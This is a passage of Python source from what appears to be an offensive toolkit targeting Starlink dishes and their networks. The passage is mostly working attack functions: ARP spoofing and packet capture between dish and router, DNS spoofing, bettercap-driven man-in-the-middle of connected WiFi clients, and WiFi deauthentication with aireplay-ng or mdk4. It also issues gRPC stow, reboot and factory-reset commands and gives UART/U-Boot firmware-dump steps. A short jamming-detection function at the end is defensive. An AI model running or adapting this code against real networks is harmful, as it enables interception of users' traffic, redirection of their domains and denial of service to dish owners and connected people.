        result['open_port_count'] = len(result['ports'])
        self._scan_results = result
        self._save_snapshot('port_scan', result)
        self._log_result('enumeration', 'scan_dish_ports', result)
        return result

    # ── Firmware Analysis ───────────────────────────────────────────────────

    def dump_firmware(self, output_path: str = None) -> Dict[str, Any]:
        """Attempt to extract firmware via debug interfaces (requires physical access)."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'method': 'uart_dd',
        }

        if output_path is None:
            output_path = str(self._firmware_dir / f'starlink_fw_{int(time.time())}.bin')

        # This requires physical UART access - check for serial ports
        try:
            import serial.tools.list_ports
            ports = list(serial.tools.list_ports.comports())
            serial_devices = [
                {'device': p.device, 'description': p.description, 'hwid': p.hwid}
                for p in ports
            ]
            result['serial_ports'] = serial_devices

            if not serial_devices:
                result['ok'] = False
                result['error'] = (
                    'No serial ports detected. Firmware dump requires physical UART '
                    'connection to the UT mainboard. Connect a USB-UART adapter to '
                    'the debug pads on the Starlink dish PCB (3.3V logic, 115200 baud, 8N1).'
                )
                self._log_result('firmware', 'dump_firmware', result)
                return result

            result['ok'] = True
            result['status'] = 'ready'
            result['output_path'] = output_path
            result['instructions'] = (
                f'Serial ports detected: {len(serial_devices)}. '
                'To dump firmware:\n'
                '1. Connect UART to Starlink UT debug pads\n'
                '2. Open serial console (115200 8N1)\n'
                '3. Interrupt U-Boot (press any key during boot)\n'
                '4. Use "md" command to dump flash contents\n'
                '5. Or boot into recovery and use dd to dump MTD partitions'
            )
        except ImportError:
            result['ok'] = False
            result['error'] = 'pyserial not installed. Run: pip install pyserial'
            result['serial_ports'] = []

        self._log_result('firmware', 'dump_firmware', result)
        return result

    def analyze_firmware(self, firmware_path: str) -> Dict[str, Any]:
        """Extract and analyze firmware image (binwalk-style signature scan, entropy, strings)."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'firmware_path': firmware_path,
            'file_info': {},
            'signatures': [],
            'strings_of_interest': [],
            'entropy_analysis': {},
        }

        fw_path = Path(firmware_path)
        if not fw_path.exists():
            result['ok'] = False
            result['error'] = f'Firmware file not found: {firmware_path}'
            return result

        stat = fw_path.stat()
        result['file_info'] = {
            'name': fw_path.name,
            'size_bytes': stat.st_size,
            'size_human': self._human_size(stat.st_size),
        }

        # Try binwalk for signature analysis
        binwalk_tool = find_tool('binwalk')
        if binwalk_tool:
            ok, output = self._run_cmd_list([binwalk_tool, firmware_path], timeout=120)
            if ok:
                for line in output.splitlines():
                    parts = line.strip().split(None, 2)
                    if len(parts) >= 3 and parts[0].isdigit():
                        result['signatures'].append({
                            'offset': int(parts[0]),
                            'hex_offset': parts[1] if parts[1].startswith('0x') else hex(int(parts[0])),
                            'description': parts[2] if len(parts) > 2 else parts[1],
                        })
        else:
            # Manual signature scanning
            try:
                with open(firmware_path, 'rb') as f:
                    data = f.read(min(stat.st_size, 10 * 1024 * 1024))
                result['signatures'] = self._scan_firmware_signatures(data)
            except Exception as e:
                result['signatures'] = [{'error': str(e)}]

        # Extract interesting strings
        strings_tool = find_tool('strings')
        if strings_tool:
            ok, output = self._run_cmd_list([strings_tool, '-n', '8', firmware_path], timeout=60)
            if ok:
                interesting_patterns = [
                    r'(?i)password', r'(?i)secret', r'(?i)token', r'(?i)api.?key',
                    r'(?i)starlink', r'(?i)spacex', r'(?i)firmware',
                    r'(?i)version\s*[\d.]', r'(?i)debug', r'(?i)root',
                    r'(?i)ssh', r'(?i)uart', r'(?i)jtag', r'(?i)bootloader',
                    r'(?i)u-boot', r'(?i)linux', r'(?i)kernel',
                    r'(?i)mount\s', r'/dev/', r'/etc/', r'/proc/',
                    r'http[s]?://', r'\d+\.\d+\.\d+\.\d+',
                ]
                for line in output.splitlines():
                    line = line.strip()
                    if any(re.search(pat, line) for pat in interesting_patterns):
                        result['strings_of_interest'].append(line)
                        if len(result['strings_of_interest']) >= 200:
                            break
        else:
            try:
                with open(firmware_path, 'rb') as f:
                    data = f.read(min(stat.st_size, 5 * 1024 * 1024))
                result['strings_of_interest'] = self._extract_strings(data, min_len=8, max_results=200)
            except Exception as e:
                result['strings_of_interest'] = [f'Error: {e}']

        # Entropy analysis (detect encrypted/compressed sections)
        try:
            with open(firmware_path, 'rb') as f:
                data = f.read(min(stat.st_size, 5 * 1024 * 1024))
            block_size = max(1024, len(data) // 256)
            entropy_values = []
            for i in range(0, len(data), block_size):
                block = data[i:i + block_size]
                ent = self._calculate_entropy(block)
                entropy_values.append({'offset': i, 'entropy': round(ent, 4)})
            avg_entropy = sum(e['entropy'] for e in entropy_values) / max(len(entropy_values), 1)
            result['entropy_analysis'] = {
                'average': round(avg_entropy, 4),
                'max': round(max((e['entropy'] for e in entropy_values), default=0), 4),
                'min': round(min((e['entropy'] for e in entropy_values), default=0), 4),
                'block_count': len(entropy_values),
                'block_size': block_size,
                'high_entropy_blocks': sum(1 for e in entropy_values if e['entropy'] > 7.5),
                'likely_encrypted': avg_entropy > 7.8,
                'likely_compressed': 7.0 < avg_entropy <= 7.8,
            }
        except Exception as e:
            result['entropy_analysis'] = {'error': str(e)}

        result['ok'] = True
        result['signature_count'] = len(result['signatures'])
        result['interesting_strings_count'] = len(result['strings_of_interest'])
        self._save_snapshot('firmware_analysis', result)
        self._log_result('firmware', 'analyze_firmware', result)
        return result

    def check_firmware_version(self) -> Dict[str, Any]:
        """Compare running version against known vulnerable versions."""
        info = self.get_dish_info()
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'dish_ip': self._dish_ip,
            'vulnerable': False,
            'vulnerabilities': [],
        }

        if not info.get('ok'):
            result['ok'] = False
            result['error'] = info.get('error', 'Could not retrieve firmware version')
            return result

        sw_version = info.get('software_version', 'unknown')
        hw_version = info.get('hardware_version', 'unknown')
        result['software_version'] = sw_version
        result['hardware_version'] = hw_version

        # Check against known vulnerable firmware versions
        matched_cves = KNOWN_VULNERABLE_VERSIONS.get(sw_version, [])
        if matched_cves:
            result['vulnerable'] = True
            for cve_id in matched_cves:
                for cve in STARLINK_CVES:
                    if cve['cve'] == cve_id:
                        result['vulnerabilities'].append(cve)
                        break

        # Determine firmware age relative to our database
        all_versions = sorted(KNOWN_VULNERABLE_VERSIONS.keys())
        if all_versions and sw_version != 'unknown':
            try:
                if sw_version <= all_versions[-1]:
                    result['version_age'] = 'potentially_outdated'
                else:
                    result['version_age'] = 'newer_than_known_database'
            except Exception:
                result['version_age'] = 'unknown'

        result['hardware_note'] = (
            'All Starlink UT hardware revisions are potentially vulnerable to '
            'voltage fault injection attacks (CVE-2022-29953) unless SpaceX has '
            'deployed hardware-level mitigations in newer board revisions.'
        )

        result['ok'] = True
        self._save_snapshot('firmware_check', result)
        self._log_result('firmware', 'check_firmware_version', result)
        return result

    def find_debug_interfaces(self) -> Dict[str, Any]:
        """Scan for UART, JTAG, SWD debug ports. Requires physical access and adapters."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'serial_ports': [],
            'jtag_detected': False,
            'openocd_available': False,
        }

        # List serial ports
        try:
            import serial.tools.list_ports
            ports = list(serial.tools.list_ports.comports())
            for p in ports:
                port_info: Dict[str, Any] = {
                    'device': p.device,
                    'description': p.description,
                    'hwid': p.hwid,
                    'vid_pid': f'{p.vid:04x}:{p.pid:04x}' if p.vid and p.pid else 'N/A',
                    'manufacturer': p.manufacturer or 'unknown',
                }
                result['serial_ports'].append(port_info)
        except ImportError:
            result['serial_error'] = 'pyserial not installed'

        # Check for JTAG adapters (FTDI, J-Link, Olimex, ARM DAPLink)
        jtag_vids = ['0403', '1366', '15ba', '0d28']
        for port in result['serial_ports']:
            vid_pid = port.get('vid_pid', '')
            if any(vid in vid_pid.lower() for vid in jtag_vids):
                result['jtag_detected'] = True
                port['possible_jtag'] = True

        # Check for OpenOCD
        openocd = find_tool('openocd')
        result['openocd_available'] = openocd is not None

        result['instructions'] = {
            'uart': {
                'description': 'Starlink UT UART debug interface',
                'settings': '115200 baud, 8N1, 3.3V logic',
                'location': 'Debug pads on UT mainboard (requires disassembly)',
                'tools_needed': 'USB-UART adapter (FTDI, CP2102, CH340)',
                'commands': [
                    'screen /dev/ttyUSB0 115200',
                    'minicom -D /dev/ttyUSB0 -b 115200',
                    'picocom -b 115200 /dev/ttyUSB0',
                ],
            },
            'jtag': {
                'description': 'JTAG/SWD debug interface on SoC',
                'tools_needed': 'J-Link, OpenOCD, or compatible JTAG adapter',
                'notes': (
                    'Starlink UT uses a custom SoC. JTAG pins may be '
                    'disabled or locked in production firmware. Check for '
                    'test pads near the main processor.'
                ),
            },
            'voltage_glitch': {
                'description': 'Voltage fault injection (CVE-2022-29953)',
                'tools_needed': 'Custom modchip or FPGA with voltage glitch capability',
                'reference': 'https://github.com/KULeuven-COSIC/Starlink-FI',
                'notes': (
                    'Requires soldering to the UT mainboard and precise '
                    'timing of voltage glitch during SoC boot sequence.'
                ),
            },
        }

        result['ok'] = True
        self._log_result('firmware', 'find_debug_interfaces', result)
        return result

    # ── Network Exploitation ────────────────────────────────────────────────

    def intercept_traffic(self, target_ip: str = None, interface: str = None) -> Dict[str, Any]:
        """ARP spoofing between dish and router to intercept traffic."""
        with self._intercept_lock:
            if self._intercept_running:
                return {'ok': False, 'error': 'Traffic interception already running'}

        dish = self._dish_ip
        gateway = target_ip or STARLINK_INFO['default_network']['router_ip']

        arpspoof = find_tool('arpspoof')
        ettercap = find_tool('ettercap')

        if not arpspoof and not ettercap:
            return {
                'ok': False,
                'error': (
                    'No ARP spoofing tool found. Install dsniff (arpspoof) or ettercap. '
                    'Debian/Ubuntu: apt install dsniff | macOS: brew install dsniff'
                ),
            }

        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'dish_ip': dish,
            'gateway_ip': gateway,
        }

        # Enable IP forwarding on Linux
        ip_forward_path = '/proc/sys/net/ipv4/ip_forward'
        if os.path.exists(ip_forward_path):
            try:
                with open(ip_forward_path, 'w') as f:
                    f.write('1')
                result['ip_forwarding'] = True
            except PermissionError:
                ok, _ = self._run_cmd('sysctl -w net.ipv4.ip_forward=1')
                result['ip_forwarding'] = ok

        try:
            if arpspoof:
                iface_args = ['-i', interface] if interface else []
                cmd = [arpspoof] + iface_args + ['-t', dish, gateway]
                self._intercept_process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
                result['tool'] = 'arpspoof'
            else:
                iface_args = ['-i', interface] if interface else []
                cmd = [ettercap, '-T', '-q', '-M', 'arp:remote'] + iface_args + \
                      [f'/{dish}//', f'/{gateway}//']
                self._intercept_process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
                result['tool'] = 'ettercap'

            with self._intercept_lock:
                self._intercept_running = True
            result['ok'] = True
            result['status'] = 'running'
            result['pid'] = self._intercept_process.pid

            # Start packet capture in background
            tcpdump = find_tool('tcpdump')
            if tcpdump:
                cap_file = str(self._captures_dir / f'intercept_{int(time.time())}.pcap')
                cap_iface = ['-i', interface] if interface else []
                tcpdump_cmd = [tcpdump] + cap_iface + [
                    '-w', cap_file, '-c', '10000', 'host', dish,
                ]
                subprocess.Popen(tcpdump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                result['capture_file'] = cap_file

        except Exception as e:
            result['ok'] = False
            result['error'] = f'Failed to start interception: {e}'

        self._log_result('network', 'intercept_traffic', result)
        return result

    def stop_intercept(self) -> Dict[str, Any]:
        """Stop traffic interception."""
        with self._intercept_lock:
            if not self._intercept_running:
                return {'ok': True, 'message': 'No interception running'}
            if self._intercept_process:
                try:
                    self._intercept_process.terminate()
                    self._intercept_process.wait(timeout=5)
                except Exception:
                    try:
                        self._intercept_process.kill()
                    except Exception:
                        pass
                self._intercept_process = None
            self._intercept_running = False
        return {'ok': True, 'message': 'Traffic interception stopped'}

    def dns_spoof(self, domain: str, ip: str, interface: str = None) -> Dict[str, Any]:
        """DNS spoofing on the Starlink network to redirect a domain to a specified IP."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'domain': domain,
            'spoof_ip': ip,
        }

        dnsspoof = find_tool('dnsspoof')
        ettercap = find_tool('ettercap')

        if not dnsspoof and not ettercap:
            return {
                'ok': False,
                'error': 'No DNS spoofing tool found. Install dsniff (dnsspoof) or ettercap.',
            }

        # Create hosts file for dnsspoof
        hosts_file = self._data_dir / 'dns_spoof_hosts.txt'
        with open(hosts_file, 'w') as f:
            f.write(f'{ip}\t{domain}\n')
            f.write(f'{ip}\t*.{domain}\n')

        try:
            if dnsspoof:
                cmd = [dnsspoof]
                if interface:
                    cmd.extend(['-i', interface])
                cmd.extend(['-f', str(hosts_file)])
                self._dns_spoof_process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
                result['tool'] = 'dnsspoof'
            else:
                etter_dns = self._data_dir / 'etter.dns'
                with open(etter_dns, 'w') as f:
                    f.write(f'{domain}\tA\t{ip}\n')
                    f.write(f'*.{domain}\tA\t{ip}\n')
                cmd = [ettercap, '-T', '-q', '-P', 'dns_spoof']
                if interface:
                    cmd.extend(['-i', interface])
                cmd.append('///')
                env = dict(os.environ)
                env['ETTERCAP_DNS_FILE'] = str(etter_dns)
                self._dns_spoof_process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env,
                )
                result['tool'] = 'ettercap'

            result['ok'] = True
            result['status'] = 'running'
            result['pid'] = self._dns_spoof_process.pid
            result['hosts_file'] = str(hosts_file)

        except Exception as e:
            result['ok'] = False
            result['error'] = f'Failed to start DNS spoofing: {e}'

        self._log_result('network', 'dns_spoof', result)
        return result

    def stop_dns_spoof(self) -> Dict[str, Any]:
        """Stop DNS spoofing."""
        with self._dns_spoof_lock:
            if self._dns_spoof_process:
                try:
                    self._dns_spoof_process.terminate()
                    self._dns_spoof_process.wait(timeout=5)
                except Exception:
                    try:
                        self._dns_spoof_process.kill()
                    except Exception:
                        pass
                self._dns_spoof_process = None
                return {'ok': True, 'message': 'DNS spoofing stopped'}
            return {'ok': True, 'message': 'No DNS spoofing running'}

    def mitm_clients(self, interface: str = None) -> Dict[str, Any]:
        """MITM attack on connected WiFi clients using ARP spoofing."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
        }

        # Get client list first
        net_info = self.get_network_info()
        clients = net_info.get('wifi_clients', [])
        if not clients:
            result['ok'] = False
            result['error'] = 'No WiFi clients found to target'
            return result

        result['target_clients'] = clients

        mitmproxy = find_tool('mitmproxy')
        bettercap = find_tool('bettercap')

        if not mitmproxy and not bettercap:
            result['ok'] = False
            result['error'] = (
                'No MITM tool found. Install mitmproxy or bettercap. '
                'pip install mitmproxy | apt install bettercap'
            )
            return result

        # Enable IP forwarding
        if os.path.exists('/proc/sys/net/ipv4/ip_forward'):
            self._run_cmd('sysctl -w net.ipv4.ip_forward=1')

        if bettercap:
            caplet_file = self._data_dir / 'starlink_mitm.cap'
            with open(caplet_file, 'w') as f:
                f.write('net.probe on\n')
                f.write('set arp.spoof.fullduplex true\n')
                client_ips = [c['ip'] for c in clients if c.get('ip') and c['ip'] != 'unknown']
                if client_ips:
                    f.write(f'set arp.spoof.targets {",".join(client_ips)}\n')
                f.write('arp.spoof on\n')
                f.write('net.sniff on\n')

            cmd = [bettercap, '--caplet', str(caplet_file)]
            if interface:
                cmd.extend(['-iface', interface])

            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result['ok'] = True
                result['tool'] = 'bettercap'
                result['pid'] = proc.pid
                result['status'] = 'running'
            except Exception as e:
                result['ok'] = False
                result['error'] = f'Failed to start bettercap: {e}'
        else:
            cmd = [mitmproxy, '--mode', 'transparent', '--showhost']
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                result['ok'] = True
                result['tool'] = 'mitmproxy'
                result['pid'] = proc.pid
                result['status'] = 'running'
                result['note'] = 'Configure iptables to redirect traffic to mitmproxy port 8080'
            except Exception as e:
                result['ok'] = False
                result['error'] = f'Failed to start mitmproxy: {e}'

        self._log_result('network', 'mitm_clients', result)
        return result

    def deauth_clients(self, target_mac: str = None, interface: str = None) -> Dict[str, Any]:
        """Deauth WiFi clients from the Starlink router."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
        }

        aireplay = find_tool('aireplay-ng')
        mdk4 = find_tool('mdk4')

        if not aireplay and not mdk4:
            result['ok'] = False
            result['error'] = (
                'No deauth tool found. Install aircrack-ng suite or mdk4. '
                'apt install aircrack-ng mdk4'
            )
            return result

        if not interface:
            # Try to find a wireless interface (prefer monitor mode)
            ok, output = self._run_cmd('iw dev')
            if ok:
                mon_match = re.search(r'Interface\s+(\w+mon\w*)', output)
                if mon_match:
                    interface = mon_match.group(1)
                else:
                    iface_match = re.search(r'Interface\s+(\w+)', output)
                    if iface_match:
                        interface = iface_match.group(1)
                        result['warning'] = f'Using {interface} - may need monitor mode first'
                    else:
                        result['ok'] = False
                        result['error'] = 'No wireless interface found. Specify interface parameter.'
                        return result

        try:
            if aireplay:
                cmd = [aireplay, '-0', '10']  # 10 deauth packets
                if target_mac:
                    cmd.extend(['-c', target_mac])
                cmd.append(interface)
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                result['ok'] = proc.returncode == 0
                result['output'] = proc.stdout.strip()
                result['tool'] = 'aireplay-ng'
            else:
                if target_mac:
                    target_file = self._data_dir / 'deauth_targets.txt'
                    with open(target_file, 'w') as f:
                        f.write(f'{target_mac}\n')
                    cmd = [mdk4, interface, 'd', '-b', str(target_file)]
                else:
                    cmd = [mdk4, interface, 'd']
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                result['ok'] = proc.returncode == 0
                result['output'] = proc.stdout.strip()
                result['tool'] = 'mdk4'

            result['status'] = 'deauth_sent'
            result['target'] = target_mac or 'broadcast'
            result['interface'] = interface
        except subprocess.TimeoutExpired:
            result['ok'] = True
            result['status'] = 'deauth_sent'
            result['note'] = 'Deauth packets sent (command timed out as expected)'
        except Exception as e:
            result['ok'] = False
            result['error'] = f'Deauth failed: {e}'

        self._log_result('network', 'deauth_clients', result)
        return result

    # ── gRPC API Exploitation ───────────────────────────────────────────────

    def grpc_enumerate(self, host: str = None, port: int = None) -> Dict[str, Any]:
        """Enumerate all available gRPC methods on the dish via reflection or known DB."""
        target_host = host or self._dish_ip
        target_port = port or self._grpc_port
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'host': target_host,
            'port': target_port,
            'services': [],
            'methods': [],
            'reflection_available': False,
        }

        grpcurl = find_tool('grpcurl')
        if grpcurl:
            # Try server reflection to list services
            ok, output = self._run_cmd_list(
                [grpcurl, '-plaintext', f'{target_host}:{target_port}', 'list'],
                timeout=10,
            )
            if ok and output:
                result['reflection_available'] = True
                services = [s.strip() for s in output.splitlines() if s.strip()]
                result['services'] = services

                # List methods for each service
                for service in services:
                    ok_m, methods_out = self._run_cmd_list(
                        [grpcurl, '-plaintext', f'{target_host}:{target_port}', 'list', service],
                        timeout=10,
                    )
                    if ok_m:
                        for method_line in methods_out.splitlines():
                            method_name = method_line.strip()
                            if method_name:
                                result['methods'].append({
                                    'service': service,
                                    'method': method_name,
                                })
                result['ok'] = True
            else:
                # Reflection failed or not available - return known methods
                result['methods'] = STARLINK_GRPC_METHODS
                result['ok'] = True
                result['source'] = 'known_database'
                result['note'] = f'gRPC reflection not available. Error: {output}'
        else:
            # No grpcurl - return known methods from database
            result['methods'] = STARLINK_GRPC_METHODS
            result['ok'] = True
            result['source'] = 'known_database'
            result['note'] = (
                'grpcurl not installed. Showing known Starlink gRPC methods. '
                'Install grpcurl: https://github.com/fullstorydev/grpcurl'
            )

        result['method_count'] = len(result['methods'])
        self._save_snapshot('grpc_enum', result)
        self._log_result('grpc', 'grpc_enumerate', result)
        return result

    def grpc_call(self, method: str, params: Optional[Dict] = None) -> Dict[str, Any]:
        """Make arbitrary gRPC calls to dish."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'dish_ip': self._dish_ip,
            'method': method,
            'params': params,
        }

        resp = self._grpc_request(method, params)
        result['ok'] = resp.get('ok', False)
        if resp.get('ok'):
            result['response'] = resp.get('data', {})
        else:
            result['error'] = resp.get('error', 'gRPC call failed')

        self._log_result('grpc', 'grpc_call', result)
        return result

    def stow_dish(self) -> Dict[str, Any]:
        """Send stow command via gRPC (moves dish to stowed/parked position)."""
        resp = self._grpc_request('dish_stow', params={'dishStow': {}})
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'action': 'stow',
        }
        if resp.get('ok') or 'error' not in resp.get('data', {}):
            result['ok'] = True
            result['message'] = 'Stow command sent - dish will point straight up'
        else:
            result['ok'] = False
            result['error'] = resp.get('error', 'Stow command failed')
        self._log_result('grpc', 'stow_dish', result)
        return result

    def unstow_dish(self) -> Dict[str, Any]:
        """Send unstow command via gRPC (moves dish to operational position)."""
        resp = self._grpc_request('dish_stow', params={'dishStow': {'unstow': True}})
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'action': 'unstow',
        }
        if resp.get('ok') or 'error' not in resp.get('data', {}):
            result['ok'] = True
            result['message'] = 'Unstow command sent - dish will resume satellite tracking'
        else:
            result['ok'] = False
            result['error'] = resp.get('error', 'Unstow command failed')
        self._log_result('grpc', 'unstow_dish', result)
        return result

    def reboot_dish(self) -> Dict[str, Any]:
        """Reboot the dish via gRPC."""
        resp = self._grpc_request('reboot', params={'reboot': {}})
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'action': 'reboot',
        }
        if resp.get('ok') or 'error' not in resp.get('data', {}):
            result['ok'] = True
            result['message'] = 'Reboot command sent - dish will restart (takes ~2 minutes)'
        else:
            result['ok'] = False
            result['error'] = resp.get('error', 'Reboot command failed')
        self._log_result('grpc', 'reboot_dish', result)
        return result

    def factory_reset(self, confirm: bool = False) -> Dict[str, Any]:
        """Factory reset via gRPC. Requires explicit confirmation."""
        if not confirm:
            return {
                'ok': False,
                'error': 'Factory reset requires confirm=True as a safety measure.',
                'warning': 'This will erase ALL dish configuration including WiFi settings.',
            }
        resp = self._grpc_request('factory_reset', params={'factoryReset': {}})
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'action': 'factory_reset',
        }
        if resp.get('ok') or 'error' not in resp.get('data', {}):
            result['ok'] = True
            result['message'] = 'Factory reset command sent - all settings will be erased'
            result['warning'] = 'The dish will reboot and require full reconfiguration'
        else:
            result['ok'] = False
            result['error'] = resp.get('error', 'Factory reset command failed')
        self._log_result('grpc', 'factory_reset', result)
        return result

    # ── RF Analysis ─────────────────────────────────────────────────────────

    def analyze_downlink(self, duration: int = 30, device: str = 'hackrf') -> Dict[str, Any]:
        """Ku-band downlink analysis (10.7-12.7 GHz) if SDR available."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'band': 'Ku-band downlink',
            'freq_range': '10.7-12.7 GHz',
        }

        hackrf_sweep = find_tool('hackrf_sweep')
        rtl_power = find_tool('rtl_power')

        if not hackrf_sweep and not rtl_power:
            result['ok'] = False
            result['error'] = (
                'No suitable SDR tool found. Ku-band analysis requires a wideband SDR '
                '(HackRF One with downconverter, or Ku-band LNB + RTL-SDR).'
            )
            result['alternatives'] = {
                'lnb_method': (
                    'Use a Ku-band LNB to shift 10.7-12.7 GHz down to L-band '
                    '(950-2150 MHz), then capture with RTL-SDR.'
                ),
                'hackrf_method': (
                    'HackRF One covers up to 6 GHz natively. For Ku-band, use a '
                    'commercial downconverter.'
                ),
            }
            # Fall back to dish diagnostic data as a proxy
            status = self.get_dish_status()
            if status.get('ok'):
                result['dish_diagnostics'] = {
                    'downlink_throughput_bps': status.get('downlink_throughput_bps', 0),
                    'pop_ping_latency_ms': status.get('pop_ping_latency_ms', 0),
                    'obstruction_pct': status.get('obstruction', {}).get('fraction_obstructed', 0),
                    'snr_above_noise_floor': status.get('snr_above_noise_floor', False),
                }
                result['ok'] = True
                result['source'] = 'dish_diagnostics'
            self._log_result('rf', 'analyze_downlink', result)
            return result

        output_file = str(self._captures_dir / f'downlink_sweep_{int(time.time())}.csv')

        if hackrf_sweep and device == 'hackrf':
            # Sweep L-band output from a Ku-band LNB (950-2150 MHz)
            cmd = [
                hackrf_sweep,
                '-f', '950:2150',
                '-w', '500000',
                '-l', '32', '-g', '32',
                '-N', str(duration),
                '-r', output_file,
            ]
            ok, output = self._run_cmd_list(cmd, timeout=duration + 30)
        elif rtl_power:
            cmd = [
                rtl_power,
                '-f', '950M:2150M:1M',
                '-g', '49.6',
                '-i', str(duration),
                '-1',
                output_file,
            ]
            ok, output = self._run_cmd_list(cmd, timeout=duration + 30)
        else:
            ok = False
            output = 'No tool available'

        if ok:
            result['ok'] = True
            result['capture_file'] = output_file
            result['tool'] = 'hackrf_sweep' if hackrf_sweep and device == 'hackrf' else 'rtl_power'
            # Parse sweep data for summary
            try:
                sweep_data = []
                with open(output_file, 'r') as f:
                    for line in f:
                        parts = line.strip().split(',')
                        if len(parts) >= 7:
                            try:
                                freq_low = int(parts[2])
                                freq_high = int(parts[3])
                                powers = [float(p) for p in parts[6:] if p.strip()]
                                if powers:
                                    sweep_data.append({
                                        'freq_low_hz': freq_low,
                                        'freq_high_hz': freq_high,
                                        'avg_power_db': round(sum(powers) / len(powers), 2),
                                        'peak_power_db': round(max(powers), 2),
                                    })
                            except (ValueError, IndexError):
                                continue
                result['sweep_points'] = len(sweep_data)
                result['sweep_summary'] = sweep_data[:50]
            except Exception as e:
                result['parse_note'] = f'Could not parse sweep data: {e}'
            result['note'] = (
                'If using a Ku-band LNB, add the LNB LO frequency '
                '(typically 9.75 GHz or 10.6 GHz) to get actual Ku-band frequency.'
            )
        else:
            result['ok'] = False
            result['error'] = f'Sweep failed: {output}'

        self._save_snapshot('downlink_analysis', result)
        self._log_result('rf', 'analyze_downlink', result)
        return result

    def analyze_uplink(self, duration: int = 30) -> Dict[str, Any]:
        """Ka-band uplink analysis (14.0-14.5 GHz). Requires specialized equipment."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'band': 'Ka-band uplink',
            'freq_range': '14.0-14.5 GHz',
            'ok': True,
            'source': 'info_only',
            'info': {
                'frequency_range': '14.0-14.5 GHz',
                'polarization': 'Circular (RHCP/LHCP)',
                'modulation': 'OFDM (Orthogonal Frequency Division Multiplexing)',
                'power_output': 'Approximately 2-4 watts EIRP',
                'beam_steering': 'Phased array with electronic beam steering',
            },
            'equipment_needed': [
                'Ka-band downconverter or mixer',
                'Ka-band horn antenna or dish with Ka-band feed',
                'High-bandwidth oscilloscope or spectrum analyzer',
                'Low-noise amplifier (LNA) for Ka-band',
            ],
        }

        # Get uplink stats from dish diagnostics
        status = self.get_dish_status()
        if status.get('ok'):
            result['dish_uplink_data'] = {
                'uplink_throughput_bps': status.get('uplink_throughput_bps', 0),
            }

        self._log_result('rf', 'analyze_uplink', result)
        return result

    def detect_jamming(self) -> Dict[str, Any]:
        """Check for signal jamming indicators via dish diagnostics and RF analysis."""
        result: Dict[str, Any] = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'jamming_detected': False,
            'indicators': [],
            'confidence': 'none',
        }

        status = self.get_dish_status()
        if not status.get('ok'):
            result['ok'] = False
            result['error'] = 'Could not get dish status for jamming analysis'
            return result

        alerts = status.get('alerts', [])
        obstruction = status.get('obstruction', {})
        pop_drop_rate = status.get('pop_ping_drop_rate', 0)
        latency = status.get('pop_ping_latency_ms', 0)
        downlink = status.get('downlink_throughput_bps', 0)
        snr_ok = status.get('snr_above_noise_floor', True)

        # Analyze indicators
        if not snr_ok:
            result['indicators'].append({
                'type': 'snr_below_floor',
                'detail': 'SNR is below noise floor - strong jamming indicator',
                'severity': 'high',
            })
            result['jamming_detected'] = True

        if pop_drop_rate > 0.5:
            result['indicators'].append({
                'type': 'high_drop_rate',
                'detail': f'PoP ping drop rate: {pop_drop_rate * 100:.1f}% (normal < 5%)',
                'severity': 'high',
            })
            result['jamming_detected'] = True

        if latency > 200:
            result['indicators'].append({
                'type': 'high_latency',
                'detail': f'PoP ping latency: {latency:.0f}ms (normal 20-60ms)',
                'severity': 'medium',
            })

        if downlink < 1000 and downlink >= 0:
            result['indicators'].append({
                'type': 'low_throughput',
                'detail': f'Downlink throughput: {downlink} bps (suspiciously low)',
                'severity': 'high',
            })
            if pop_drop_rate > 0.3:
                result['jamming_detected'] = True

        if obstruction.get('currently_obstructed') and obstruction.get('fraction_obstructed', 0) > 50:
            result['indicators'].append({
                'type': 'excessive_obstruction',
                'detail': f'Obstruction: {obstruction["fraction_obstructed"]:.1f}% (may indicate interference)',
                'severity': 'medium',
            })

        if 'motorsStuck' in alerts:
            result['indicators'].append({
                'type': 'motors_stuck',
                'detail': 'Motors stuck alert - dish cannot track satellite',
                'severity': 'medium',
            })

        # Set confidence level
        high_count = sum(1 for i in result['indicators'] if i['severity'] == 'high')
        med_count = sum(1 for i in result['indicators'] if i['severity'] == 'medium')
        if high_count >= 2:
            result['confidence'] = 'high'
        elif high_count >= 1 or med_count >= 2:
            result['confidence'] = 'medium'
        elif med_count >= 1:
            result['confidence'] = 'low'

        result['ok'] = True
        result['recommendation'] = (
            'If jamming is suspected, check for nearby RF sources in the Ku-band '
            '(10.7-12.7 GHz) using a spectrum analyzer. Common sources include '
            'radar systems, satellite uplinks, and intentional jammers.'
        )
